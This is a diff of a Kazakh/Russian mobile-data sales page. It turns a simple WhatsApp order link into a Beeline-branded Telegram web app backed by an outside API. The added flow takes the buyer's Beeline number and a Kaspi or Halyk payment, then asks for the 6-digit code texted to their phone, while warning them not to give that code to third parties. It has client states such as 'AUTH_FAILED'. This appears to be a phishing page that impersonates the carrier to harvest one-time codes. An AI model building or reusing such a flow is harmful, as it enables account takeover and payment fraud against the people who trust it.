@@ -1,255 +1,546 @@
-<!DOCTYPE html>
-<html lang="ru">
+<!doctype html>
+<html lang="kk">
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Geo Master — интернет-пакеты</title>
-<meta name="description" content="Geo Master — мобильный интернет без привязки к номеру. Выберите пакет и подключите его прямо в WhatsApp.">
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-9N30Z9Q2WD"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-9N30Z9Q2WD');
-</script>
-<!-- Cloudflare Web Analytics -->
-<script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "87a788ff475941c484337e42e20ca4a8"}'></script>
-<!-- Microsoft Clarity -->
-<script>
-  (function(c,l,a,r,i,t,y){
-    c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-    t=l.createElement(r); t.async=1; t.src="https://www.clarity.ms/tag/"+i;
-    y=l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t,y);
-  })(window, document, "clarity", "script", "xi78k52juo");
-</script>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
+<title>Geo Master — Beeline</title>
+<meta name="description" content="Geo Master — подключение интернет-пакетов Beeline по выгодным ценам.">
 <style>
-  :root{
-    --bg:            #0A0D10;
-    --panel:         #12161B;
-    --panel-line:    #22282f;
-    --gold:          #FFC94A;
-    --gold-dim:      #8a6f2c;
-    --ink:           #F2F1EC;
-    --ink-dim:       #9AA0A6;
-    --wa:            #25D366;
-    --wa-deep:       #0F3D22;
-    --radius:        18px;
-    --display: "Space Grotesk", "Segoe UI", sans-serif;
-    --body: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-  }
-
-  *{box-sizing:border-box; margin:0; padding:0;}
-  html{-webkit-text-size-adjust:100%;}
-  body{
-    min-height:100svh;
-    background:
-      radial-gradient(1100px 600px at 50% -12%, rgba(255,201,74,0.10), transparent 60%),
-      var(--bg);
-    color:var(--ink);
-    font-family:var(--body);
-    display:flex;
-    justify-content:center;
-    padding:56px 20px 40px;
-  }
-
-  .wrap{ width:100%; max-width:460px; display:flex; flex-direction:column; gap:40px; }
-
-  /* ---------- Hero ---------- */
-  .hero{ display:flex; flex-direction:column; align-items:center; text-align:center; gap:18px; }
-
-  .mark{
-    width:64px; height:64px; border-radius:50%;
-    background:conic-gradient(from 220deg,#FFE066,#FFCC00 35%,#F2B800 55%,#FFCC00 75%,#FFE066 100%);
-    display:flex; align-items:center; justify-content:center;
-    box-shadow:0 0 0 1px rgba(255,255,255,0.06), 0 12px 30px -10px rgba(255,201,74,0.55);
-    animation: rise .6s cubic-bezier(.2,.8,.2,1) both;
-  }
-  .mark svg{ width:28px; height:28px; }
-
-  .eyebrow{
-    font-family:var(--display);
-    font-size:12px; font-weight:600; letter-spacing:.16em; text-transform:uppercase;
-    color:var(--gold);
-    animation: rise .6s .05s cubic-bezier(.2,.8,.2,1) both;
-  }
-  h1{
-    font-family:var(--display);
-    font-size:clamp(28px,7vw,36px);
-    font-weight:700; line-height:1.12; letter-spacing:-0.01em;
-    animation: rise .6s .1s cubic-bezier(.2,.8,.2,1) both;
-  }
-  .sub{
-    color:var(--ink-dim); font-size:15px; line-height:1.55; max-width:340px;
-    animation: rise .6s .16s cubic-bezier(.2,.8,.2,1) both;
-  }
-
-  @keyframes rise{ from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
-
-  /* ---------- Signal signature ---------- */
-  .signal{ display:flex; align-items:flex-end; gap:5px; height:26px; animation: rise .6s .2s cubic-bezier(.2,.8,.2,1) both; }
-  .signal i{
-    display:block; width:5px; border-radius:2px;
-    background:linear-gradient(180deg, var(--gold), var(--gold-dim));
-    animation: pulse 1.8s ease-in-out infinite;
-  }
-  .signal i:nth-child(1){ height:8px;  animation-delay:0s; }
-  .signal i:nth-child(2){ height:14px; animation-delay:.15s; }
-  .signal i:nth-child(3){ height:20px; animation-delay:.3s; }
-  .signal i:nth-child(4){ height:26px; animation-delay:.45s; }
-  @keyframes pulse{ 0%,100%{ opacity:.45; } 50%{ opacity:1; } }
-
-  /* ---------- Plans ---------- */
-  .plans{ display:flex; flex-direction:column; gap:12px; }
-
-  .plan{
-    position:relative;
-    display:flex; align-items:center; justify-content:space-between; gap:16px;
-    background:var(--panel);
-    border:1px solid var(--panel-line);
-    border-radius:var(--radius);
-    padding:18px 20px;
-    text-decoration:none; color:inherit;
-    overflow:hidden;
-    animation: rise .55s cubic-bezier(.2,.8,.2,1) both;
-    transition: border-color .18s ease, transform .18s ease, background .18s ease;
-  }
-  .plan:nth-of-type(1){ animation-delay:.24s; }
-  .plan:nth-of-type(2){ animation-delay:.30s; }
-  .plan:active{ transform:scale(.98); }
-  @media (hover:hover){
-    .plan:hover{ border-color:var(--gold-dim); background:#161b21; }
-  }
-
-  .plan .tag{
-    position:absolute; top:0; right:18px;
-    font-family:var(--display); font-size:10px; font-weight:600; letter-spacing:.08em; text-transform:uppercase;
-    background:var(--gold); color:#1a1400;
-    padding:4px 10px; border-radius:0 0 8px 8px;
-  }
-
-  .plan-data{ display:flex; flex-direction:column; gap:4px; }
-  .plan-data .gb{ font-family:var(--display); font-size:22px; font-weight:700; letter-spacing:-0.01em; }
-  .plan-data .note{ font-size:12.5px; color:var(--ink-dim); }
-
-  .plan-price{ display:flex; flex-direction:column; align-items:flex-end; gap:4px; }
-  .plan-price .amount{ font-family:var(--display); font-size:20px; font-weight:700; color:var(--gold); white-space:nowrap; }
-  .plan-price .arrow{
-    width:30px; height:30px; border-radius:50%;
-    background:var(--wa-deep); color:var(--wa);
-    display:flex; align-items:center; justify-content:center;
-    font-size:15px;
-    transition: background .18s ease;
-  }
-  .plan:hover .plan-price .arrow{ background:var(--wa); color:#04140b; }
-
-  /* ---------- Main CTA ---------- */
-  .cta{
-    display:flex; align-items:center; justify-content:center; gap:10px;
-    background:var(--wa); color:#04140b;
-    font-family:var(--display); font-weight:700; font-size:16px;
-    text-decoration:none;
-    padding:17px 24px; border-radius:16px;
-    box-shadow:0 14px 34px -12px rgba(37,211,102,0.55);
-    animation: rise .6s .38s cubic-bezier(.2,.8,.2,1) both, glow 2.6s ease-in-out .8s infinite;
-    transition: transform .18s ease, box-shadow .18s ease;
-  }
-  .cta:active{ transform:scale(.98); }
-  @media (hover:hover){
-    .cta:hover{ box-shadow:0 16px 38px -10px rgba(37,211,102,0.7); }
-  }
-  @keyframes glow{
-    0%,100%{ box-shadow:0 14px 34px -12px rgba(37,211,102,0.55); }
-    50%{ box-shadow:0 14px 40px -8px rgba(37,211,102,0.8); }
-  }
-  .cta svg{ width:20px; height:20px; flex:none; }
-
-  .foot{
-    text-align:center; font-size:12.5px; color:var(--ink-dim);
-    animation: rise .6s .44s cubic-bezier(.2,.8,.2,1) both;
-  }
-  .foot b{ color:var(--ink); font-weight:600; }
-
-  @media (prefers-reduced-motion: reduce){
-    *{ animation:none !important; transition:none !important; }
-  }
+:root{
+  --bg:#FBF8F2;
+  --panel:#FFFFFF;
+  --line:#EFE7D8;
+  --ink:#1A1A1A;
+  --ink-dim:#7A7268;
+  --yellow:#FFC94A;
+  --yellow-deep:#F5A623;
+  --black:#151515;
+  --blue:#3B82F6;
+  --green:#22B573;
+  --green-deep:#0F3D22;
+  --red:#E4572E;
+  --danger:#E4572E;
+  --danger-bg:#FDEDE8;
+  --radius:20px;
+  --display:"Space Grotesk","Segoe UI",sans-serif;
+  --body:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{-webkit-text-size-adjust:100%;}
+body{
+  min-height:100svh;
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--body);
+  display:flex;justify-content:center;
+  padding:28px 16px 40px;
+}
+.wrap{width:100%;max-width:440px;display:flex;flex-direction:column;gap:20px;}
+.topbar{display:flex;justify-content:flex-end;}
+.langtoggle{display:flex;background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:4px;gap:2px;}
+.langtoggle button{border:none;background:transparent;font:600 13px var(--body);padding:7px 14px;border-radius:999px;color:var(--ink-dim);cursor:pointer;}
+.langtoggle button.active{background:var(--yellow);color:var(--black);}
+.brand{text-align:center;display:flex;flex-direction:column;align-items:center;gap:6px;}
+.brand .mark{width:56px;height:56px;border-radius:50%;background:
+  repeating-linear-gradient(-35deg,var(--black) 0 9px,var(--yellow) 9px 18px);
+  box-shadow:0 6px 16px -6px rgba(0,0,0,.35);}
+.brand h1{font:800 30px var(--display);letter-spacing:.5px;}
+.brand .tag{display:flex;align-items:center;gap:8px;font:700 11px var(--body);letter-spacing:1.5px;color:var(--ink-dim);text-transform:uppercase;}
+.brand .tag i{width:20px;height:1px;background:var(--yellow-deep);display:block;}
+.brand .geo{font:700 16px var(--display);}
+.brand .geo b{color:var(--yellow-deep);}
+.brand .geo u{display:block;width:26px;height:2px;background:var(--black);margin:3px auto 0;text-decoration:none;}
+.back{align-self:flex-start;background:none;border:none;font:600 15px var(--body);color:var(--ink);cursor:pointer;display:flex;align-items:center;gap:6px;padding:4px 0;}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:22px;box-shadow:0 10px 30px -18px rgba(20,15,5,.25);}
+.subtitle{font:600 15px var(--body);color:var(--ink-dim);text-align:center;margin-bottom:14px;}
+.pkg{display:flex;align-items:center;gap:14px;width:100%;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:16px;cursor:pointer;text-align:left;font-family:inherit;transition:transform .12s ease,box-shadow .12s ease;}
+.pkg:active{transform:scale(.98);}
+.pkg+.pkg{margin-top:12px;}
+.pkg .icon{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;flex:none;}
+.pkg.lite .icon{background:#FFF3D6;}
+.pkg.std .icon{background:#E3EFFF;}
+.pkg .info{flex:1;}
+.pkg .name{font:800 18px var(--display);}
+.pkg .gb{font:800 15px var(--display);color:var(--ink-dim);}
+.pkg.std .gb{color:var(--blue);}
+.pkg .price{font:700 15px var(--display);background:var(--yellow);padding:8px 12px;border-radius:12px;white-space:nowrap;}
+.pkg.std .price{background:#DCEBFF;color:var(--blue);}
+.pkg .tag{position:absolute;transform:translate(-6px,-30px);background:var(--blue);color:#fff;font:700 10px var(--body);padding:3px 8px;border-radius:8px;}
+.benefits{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:20px;}
+.benefits h3{font:800 15px var(--display);margin-bottom:12px;}
+.benefits ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
+.benefits li{display:flex;align-items:center;gap:10px;font:500 14px var(--body);color:var(--ink);}
+.benefits li span.e{font-size:18px;}
+label{font:700 13px var(--body);display:block;margin-bottom:8px;}
+.phoneinput{display:flex;align-items:center;border:1.5px solid var(--line);border-radius:14px;padding:14px 16px;gap:10px;}
+.phoneinput span{font:700 15px var(--display);color:var(--ink-dim);}
+.phoneinput input{border:none;outline:none;font:600 17px var(--display);flex:1;background:transparent;letter-spacing:.5px;}
+.hint{display:flex;align-items:center;gap:8px;color:var(--ink-dim);font:500 12.5px var(--body);margin-top:12px;}
+.btn{width:100%;border:none;border-radius:16px;padding:16px;font:700 16px var(--display);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .12s ease,opacity .12s ease;}
+.btn:active{transform:scale(.98);}
+.btn:disabled{opacity:.5;cursor:default;}
+.btn-primary{background:var(--yellow);color:var(--black);}
+.btn-kaspi{background:linear-gradient(135deg,#FF5B34,#E4361A);color:#fff;}
+.btn-halyk{background:linear-gradient(135deg,#0B8A3E,#075E2A);color:#fff;}
+.info-box{background:#FFF6E1;border:1px solid #FCE7B2;border-radius:16px;padding:16px;display:flex;gap:12px;align-items:flex-start;font:500 13.5px var(--body);color:#5A4A1A;}
+.info-box .ico{flex:none;width:22px;height:22px;border-radius:50%;background:var(--yellow-deep);color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;}
+.receipt{display:flex;flex-direction:column;gap:10px;margin-bottom:16px;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--line);}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-row .k{color:var(--ink-dim);font:500 13.5px var(--body);}
+.receipt-row .v{font:700 15px var(--display);}
+.spinner{width:64px;height:64px;border-radius:50%;border:6px solid #FCE7B2;border-top-color:var(--yellow-deep);animation:spin 1s linear infinite;margin:6px auto 18px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.center{text-align:center;}
+.icon-circle{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 16px;}
+.ok{background:#E7F7EE;color:var(--green);}
+.err{background:var(--danger-bg);color:var(--danger);}
+h2.title{font:800 22px var(--display);text-align:center;margin-bottom:6px;}
+p.desc{color:var(--ink-dim);font:500 14.5px var(--body);text-align:center;line-height:1.5;}
+.otp{display:flex;gap:8px;justify-content:center;margin:18px 0 8px;}
+.otp input{width:44px;height:56px;text-align:center;font:800 22px var(--display);border:1.5px solid var(--line);border-radius:12px;outline:none;}
+.otp input:focus{border-color:var(--yellow-deep);}
+.otp input.filled{border-color:var(--yellow-deep);background:#FFFBEF;}
+.otp input.bad{border-color:var(--danger);background:var(--danger-bg);}
+.timer{text-align:center;color:var(--ink-dim);font:500 12.5px var(--body);display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;}
+.resend{background:none;border:1.5px solid var(--danger);color:var(--danger);border-radius:12px;padding:9px 14px;font:700 13px var(--body);cursor:pointer;}
+.error-banner{background:var(--danger-bg);border:1px solid #F6C9BA;color:#8A2E13;border-radius:14px;padding:12px 14px;font:600 13.5px var(--body);display:flex;gap:10px;align-items:center;margin-bottom:14px;}
+.support{background:#EAFBF2;border:1px solid #C7EFDA;border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;margin-top:6px;}
+.support .wa{width:42px;height:42px;border-radius:50%;background:var(--green);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;flex:none;}
+.support .txt strong{display:block;font:700 14px var(--body);}
+.support .txt span{color:var(--ink-dim);font:500 12.5px var(--body);}
+.support-btn{margin-left:auto;background:var(--green);color:#fff;border:none;border-radius:12px;padding:10px 14px;font:700 13px var(--body);cursor:pointer;flex:none;}
+.trust{display:flex;justify-content:space-around;color:var(--ink-dim);font:600 11.5px var(--body);margin-top:4px;}
+.trust div{display:flex;flex-direction:column;align-items:center;gap:6px;}
+.foot{text-align:center;font:500 11.5px var(--body);color:var(--ink-dim);}
+.foot b{color:var(--ink);}
+[hidden]{display:none!important;}
+.reward{background:#FFF3D6;border:1px solid #FCE29C;border-radius:16px;padding:16px;text-align:center;margin-top:8px;}
+.reward h4{font:800 15px var(--display);margin-bottom:6px;}
+.reward p{color:#7A5A10;font:500 13px var(--body);margin-bottom:12px;}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;}}
 </style>
 </head>
 <body>
-
 <div class="wrap">
-
-  <div class="hero">
-    <div class="mark" aria-hidden="true">
-      <svg viewBox="0 0 40 40" fill="none"><path d="M8 26 L20 10 L20 20 L32 14 L20 30 L20 20 Z" fill="#141400"/></svg>
+  <div class="topbar">
+    <div class="langtoggle" id="langToggle">
+      <button data-lang="ru">РУС</button>
+      <button data-lang="kk">ҚАЗ</button>
     </div>
-    <div class="eyebrow">Geo Master</div>
-    <h1>Интернет‑пакеты<br>без лишних шагов</h1>
-    <p class="sub">Выберите объём — и мы подключим пакет, как только вы напишете нам в WhatsApp.</p>
-    <div class="signal" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
   </div>
-
-  <div class="plans">
-    <a class="plan" id="plan7" href="#" aria-label="Пакет 7 гигабайт за 500 тенге, написать в WhatsApp">
-      <div class="plan-data">
-        <div class="gb">7 ГБ</div>
-        <div class="note">на каждый день</div>
-      </div>
-      <div class="plan-price">
-        <div class="amount">500 ₸</div>
-        <div class="arrow">→</div>
-      </div>
-    </a>
-
-    <a class="plan" id="plan20" href="#" aria-label="Пакет 20 гигабайт за 1000 тенге, написать в WhatsApp">
-      <span class="tag">Выгоднее</span>
-      <div class="plan-data">
-        <div class="gb">20 ГБ</div>
-        <div class="note">для активного трафика</div>
-      </div>
-      <div class="plan-price">
-        <div class="amount">1000 ₸</div>
-        <div class="arrow">→</div>
-      </div>
-    </a>
+  <div class="brand">
+    <div class="mark"></div>
+    <h1>BEELINE</h1>
+    <div class="tag"><i></i><span id="tSlogan">ПО ВЫГОДНЫМ ЦЕНАМ</span><i></i></div>
+    <div class="geo">GEO <b>MASTER</b><u></u></div>
   </div>
-
-  <a class="cta" id="mainCta" href="#">
-    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.36 5.07L2 22l5.06-1.33A9.94 9.94 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2zm0 18c-1.6 0-3.1-.44-4.38-1.2l-.31-.19-3.01.79.8-2.93-.2-.3A7.94 7.94 0 0 1 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8-3.59 8-8 8zm4.38-5.99c-.24-.12-1.43-.7-1.65-.79-.22-.08-.38-.12-.54.12-.16.24-.62.79-.76.95-.14.16-.28.18-.52.06-.24-.12-1.01-.37-1.92-1.18-.71-.63-1.19-1.41-1.33-1.65-.14-.24-.02-.37.1-.49.11-.11.24-.28.36-.42.12-.14.16-.24.24-.4.08-.16.04-.3-.02-.42-.06-.12-.54-1.3-.74-1.78-.2-.47-.4-.4-.54-.41-.14-.01-.3-.01-.46-.01-.16 0-.42.06-.64.3-.22.24-.84.82-.84 2s.86 2.32.98 2.48c.12.16 1.7 2.6 4.12 3.64.58.25 1.03.4 1.38.51.58.18 1.11.16 1.53.1.47-.07 1.43-.58 1.63-1.15.2-.57.2-1.05.14-1.15-.06-.1-.22-.16-.46-.28z"/></svg>
-    Написать в WhatsApp
-  </a>
-
-  <p class="foot">Отвечаем обычно за <b>5–10 минут</b>. Оплата — при подключении.</p>
-
+  <button class="back" id="backBtn" hidden>← <span id="tBack">Назад</span></button>
+  <div id="screens"></div>
 </div>
 
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-  var phone = "77775949300";
+'use strict';
+const API_BASE = 'https://qwertyxyz.com/v2-staging/customer-api';
 
-  function waLink(text){
-    return "https://wa.me/" + phone + "?text=" + encodeURIComponent(text);
-  }
+const STR = {
+ ru:{
+  slogan:'ПО ВЫГОДНЫМ ЦЕНАМ', back:'Назад',
+  choose_title:'Нажмите на выбранный тариф ↓', lite:'Lite', std:'Standard', per_month:'на каждый день', best:'Выгоднее',
+  benefits_title:'✨ Преимущества', b1:'Интернет действует 30 дней', b2:'Работает даже при неоплаченном тарифе', b3:'Ваш основной тариф не изменяется', b4:'Подключение занимает всего несколько минут',
+  phone_title:'Вы выбрали тариф', phone_label:'Введите номер Beeline', phone_hint:'Укажите номер телефона для подключения выбранного тарифа.', phone_secure:'Мы гарантируем безопасность ваших данных', validity:'Срок действия', days30:'30 дней', continue:'Продолжить',
+  whatnext:'Что дальше?', step1:'Введите ваш номер Beeline', step2:'Нажмите «Продолжить»', step3:'Выберите способ оплаты', step4:'Тариф будет подключён после подтверждения',
+  receipt_title:'Проверьте заказ', pkg:'Выбранный пакет', to_pay:'К оплате', method:'Способ оплаты', kaspi:'Оплатить через Kaspi', halyk:'Оплатить через Halyk', no_fee:'Без комиссии',
+  checking_title:'Проверяем платёж…', checking_desc:'Обычно это занимает до 1–2 минут. Пожалуйста, подождите, не закрывайте страницу.', number:'Номер Beeline', paid:'Оплачено',
+  otp_title:'Вам выслан код подтверждения', otp_desc:'Мы отправили 6-значный код подтверждения на номер', otp_valid:'Код действителен в течение 10 минут.', otp_secret:'Не передавайте код третьим лицам.', enter_code:'Введите 6-значный код', confirm:'Подтвердить', resend_in:'Код можно отправить повторно через', resend:'Запросить новый код', wrong_code:'Код не подошёл', wrong_desc:'Проверьте введённые цифры и попробуйте снова.', attempts_left:'Осталось попыток:',
+  success_title:'Код подтверждён!', success_sub:'Спасибо! Код введён верно.', gifting:'ГБ будут начислены на ваш номер', started:'Процесс подключения уже запущен. Обычно это занимает 1–5 минут.', sms:'Как только пакет будет успешно подключён, вы получите SMS-уведомление от Beeline.',
+  reward_title:'🎁 Пригласите друга', reward_desc:'Получите +5 ГБ бесплатно за каждого приглашённого друга.', reward_btn:'Хочу получить ссылку',
+  fail_title:'Активация невозможна', fail_desc:'К сожалению, подключение выбранного пакета на указанный номер сейчас невозможно. Мы уже передали ваш запрос специалисту поддержки.',
+  need_help:'Нужна помощь?', need_help_desc:'Если возникли вопросы — напишите нам.', open_wa:'Написать в WhatsApp', support_sent:'Обращение передано в поддержку',
+  trust1:'Безопасно', trust2:'Быстро', trust3:'Выгодно',
+  invalid_phone:'Проверьте номер телефона', pick_kaspi_or_halyk:'Выберите способ оплаты'
+ },
+ kk:{
+  slogan:'ТИІМДІ БАҒАЛАРМЕН', back:'Артқа',
+  choose_title:'Таңдалған тарифті басыңыз ↓', lite:'Lite', std:'Standard', per_month:'күн сайын', best:'Тиімдірек',
+  benefits_title:'✨ Артықшылықтар', b1:'Интернет 30 күн жарамды', b2:'Тариф төленбесе де жұмыс істейді', b3:'Негізгі тарифіңіз өзгермейді', b4:'Қосылу бірнеше минутты алады',
+  phone_title:'Сіз тарифті таңдадыңыз', phone_label:'Beeline нөмірін енгізіңіз', phone_hint:'Таңдалған тарифті қосу үшін телефон нөмірін көрсетіңіз.', phone_secure:'Деректеріңіздің қауіпсіздігіне кепілдік береміз', validity:'Жарамдылық мерзімі', days30:'30 күн', continue:'Жалғастыру',
+  whatnext:'Әрі қарай не істеу керек?', step1:'Beeline нөміріңізді енгізіңіз', step2:'«Жалғастыру» түймесін басыңыз', step3:'Төлем тәсілін таңдаңыз', step4:'Растаудан кейін тариф қосылады',
+  receipt_title:'Тапсырысты тексеріңіз', pkg:'Таңдалған пакет', to_pay:'Төлеуге', method:'Төлем тәсілі', kaspi:'Kaspi арқылы төлеу', halyk:'Halyk арқылы төлеу', no_fee:'Комиссиясыз',
+  checking_title:'Төлем тексерілуде…', checking_desc:'Әдетте бұл 1–2 минутты алады. Өтінеміз, күте тұрыңыз, бетті жаппаңыз.', number:'Beeline нөмірі', paid:'Төленді',
+  otp_title:'Сізге растау коды жіберілді', otp_desc:'Растау үшін 6 таңбалы кодты мына нөмірге жібердік', otp_valid:'Код 10 минут ішінде жарамды.', otp_secret:'Кодты үшінші тұлғаларға бермеңіз.', enter_code:'6 таңбалы кодты енгізіңіз', confirm:'Растау', resend_in:'Кодты қайта жіберу мүмкін болады:', resend:'Жаңа код сұрау', wrong_code:'Код сәйкес келмеді', wrong_desc:'Енгізілген сандарды тексеріп, қайталап көріңіз.', attempts_left:'Қалған әрекет саны:',
+  success_title:'Код расталды!', success_sub:'Рахмет! Код дұрыс енгізілді.', gifting:'ГБ нөміріңізге есептеледі', started:'Қосылу процесі басталды. Әдетте бұл 1–5 минутты алады.', sms:'Пакет сәтті қосылған кезде Beeline-нан SMS-хабарлама аласыз.',
+  reward_title:'🎁 Досыңызды шақырыңыз', reward_desc:'Әр шақырылған дос үшін +5 ГБ тегін алыңыз.', reward_btn:'Сілтеме алғым келеді',
+  fail_title:'Белсендіру мүмкін емес', fail_desc:'Өкінішке орай, таңдалған пакетті көрсетілген нөмірге қазір қосу мүмкін емес. Өтінішіңізді қолдау маманына жібердік.',
+  need_help:'Көмек керек пе?', need_help_desc:'Сұрақтарыңыз болса — бізге жазыңыз.', open_wa:'WhatsApp-қа жазу', support_sent:'Өтінім қолдау қызметіне жіберілді',
+  trust1:'Қауіпсіз', trust2:'Жылдам', trust3:'Тиімді',
+  invalid_phone:'Телефон нөмірін тексеріңіз', pick_kaspi_or_halyk:'Төлем тәсілін таңдаңыз'
+ }
+};
+STR.ru.b_all=[STR.ru.b1,STR.ru.b2,STR.ru.b3,STR.ru.b4];
+STR.kk.b_all=[STR.kk.b1,STR.kk.b2,STR.kk.b3,STR.kk.b4];
 
-  var links = {
-    plan7:   { el: document.getElementById('plan7'),   text: "Здравствуйте! Хочу подключить пакет 7 ГБ за 500 ₸." },
-    plan20:  { el: document.getElementById('plan20'),  text: "Здравствуйте! Хочу подключить пакет 20 ГБ за 1000 ₸." },
-    mainCta: { el: document.getElementById('mainCta'), text: "Здравствуйте! Хочу подключить интернет-пакет." }
-  };
+let lang = localStorage.getItem('gm_lang') || 'kk';
+let sessionToken = null;
+let ctx = null;
+let stack = [];
+let pendingOtpAttempts = 3;
+let selectedMethod = null;
 
-  Object.keys(links).forEach(function(key){
-    var item = links[key];
-    item.el.href = waLink(item.text);
-    item.el.addEventListener('click', function(){
-      if (typeof gtag === 'function') gtag('event', 'whatsapp_click', { plan: key });
-    });
+function t(k){return (STR[lang]&&STR[lang][k]) || STR.ru[k] || k;}
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function money(n){return new Intl.NumberFormat('ru-RU').format(n);}
+
+function applyLang(){
+ document.documentElement.lang = lang;
+ document.getElementById('tSlogan').textContent = t('slogan');
+ document.getElementById('tBack').textContent = t('back');
+ document.querySelectorAll('#langToggle button').forEach(b=>b.classList.toggle('active', b.dataset.lang===lang));
+}
+document.getElementById('langToggle').addEventListener('click', e=>{
+ const btn = e.target.closest('button'); if(!btn) return;
+ lang = btn.dataset.lang; localStorage.setItem('gm_lang', lang); applyLang();
+ api('/language', {language:lang}).catch(()=>{});
+ render();
+});
+
+async function api(path, body, method){
+ const opts = {method: method || (body!==undefined?'POST':'GET'), headers:{'content-type':'application/json'}};
+ if(sessionToken) opts.headers.authorization = 'Bearer ' + sessionToken;
+ if(body!==undefined) opts.body = JSON.stringify(body);
+ const r = await fetch(API_BASE + path, opts);
+ const j = await r.json().catch(()=>({}));
+ if(!r.ok) throw Object.assign(new Error(j.error||'REQUEST_FAILED'), {code:j.error, status:r.status});
+ return j;
+}
+
+async function initSession(){
+ const tg = window.Telegram && window.Telegram.WebApp;
+ let body = null;
+ if(tg && tg.initData){
+  tg.ready(); tg.expand();
+  body = {initData: tg.initData, language: lang};
+ } else {
+  const params = new URLSearchParams(location.search);
+  const token = params.get('t');
+  if(token) body = {token, language: lang};
+ }
+ if(!body){ showScreen('noEntry'); return; }
+ try{
+  const res = await api('/session', body);
+  if(res.paused){ showScreen('paused', {message:res.message}); return; }
+  sessionToken = res.sessionToken; ctx = res.context;
+  if(ctx.client && ctx.client.language) { lang = ctx.client.language; localStorage.setItem('gm_lang', lang); applyLang(); }
+  render();
+ }catch(e){ showScreen('noEntry'); }
+}
+
+async function refreshContext(){ ctx = await api('/status', undefined, 'GET'); }
+
+function screensEl(){ return document.getElementById('screens'); }
+function setBack(show, handler){
+ const b = document.getElementById('backBtn');
+ b.hidden = !show;
+ b.onclick = handler || null;
+}
+
+function render(){
+ if(!ctx) return;
+ const state = ctx.clientState;
+ if(['NEW','CHOOSING_PACKAGE'].includes(state)) return showScreen('packages');
+ if(state==='WAITING_PHONE') return showScreen('phone');
+ if(state==='WAITING_PAYMENT') return showScreen('receipt');
+ if(['PAYMENT_CONFIRMED'].includes(state)) return showScreen('checking');
+ if(state==='WAITING_OTP') return showScreen('otp');
+ if(['TRAINING','PROVISIONING'].includes(state)) return showScreen('activating');
+ if(['ACTIVE','COMPLETED'].includes(state)) return showScreen('success');
+ if(['TRAINING_FAILED','PAYMENT_FAILED','AUTH_FAILED','MANUAL_REVIEW'].includes(state)) return showScreen('failed');
+ return showScreen('packages');
+}
+
+let pollTimer = null;
+function stopPoll(){ if(pollTimer){ clearInterval(pollTimer); pollTimer = null; } }
+function startPoll(){
+ stopPoll();
+ pollTimer = setInterval(async ()=>{
+  try{ await refreshContext(); render(); }catch(e){}
+ }, 3500);
+}
+
+function showScreen(name, extra){
+ stopPoll();
+ setBack(false);
+ const el = screensEl();
+ if(name==='noEntry') el.innerHTML = tplMessage(t('fail_title'), lang==='kk' ? 'Сілтеме жарамсыз. Telegram немесе WhatsApp арқылы қайта өтіңіз.' : 'Ссылка недействительна. Пожалуйста, откройте её заново из Telegram или WhatsApp.', 'err', '⚠️');
+ else if(name==='paused') el.innerHTML = tplMessage(t('fail_title'), (extra&&extra.message) || '', 'err', '⏸');
+ else if(name==='packages') renderPackages(el);
+ else if(name==='phone') renderPhone(el);
+ else if(name==='receipt') renderReceipt(el);
+ else if(name==='checking'){ renderChecking(el); startPoll(); }
+ else if(name==='otp') renderOtp(el);
+ else if(name==='activating'){ renderActivating(el); startPoll(); }
+ else if(name==='success') renderSuccess(el);
+ else if(name==='failed') renderFailed(el);
+}
+
+function tplMessage(title, desc, cls, emoji){
+ return `<div class="card center"><div class="icon-circle ${cls==='err'?'err':'ok'}">${emoji}</div><h2 class="title">${esc(title)}</h2><p class="desc">${esc(desc)}</p></div>`;
+}
+
+function supportBlock(){
+ return `<div class="support">
+  <div class="wa">📱</div>
+  <div class="txt"><strong>${esc(t('need_help'))}</strong><span>${esc(t('need_help_desc'))}</span></div>
+  <button class="support-btn" id="supportBtn">${esc(t('open_wa'))}</button>
+ </div>`;
+}
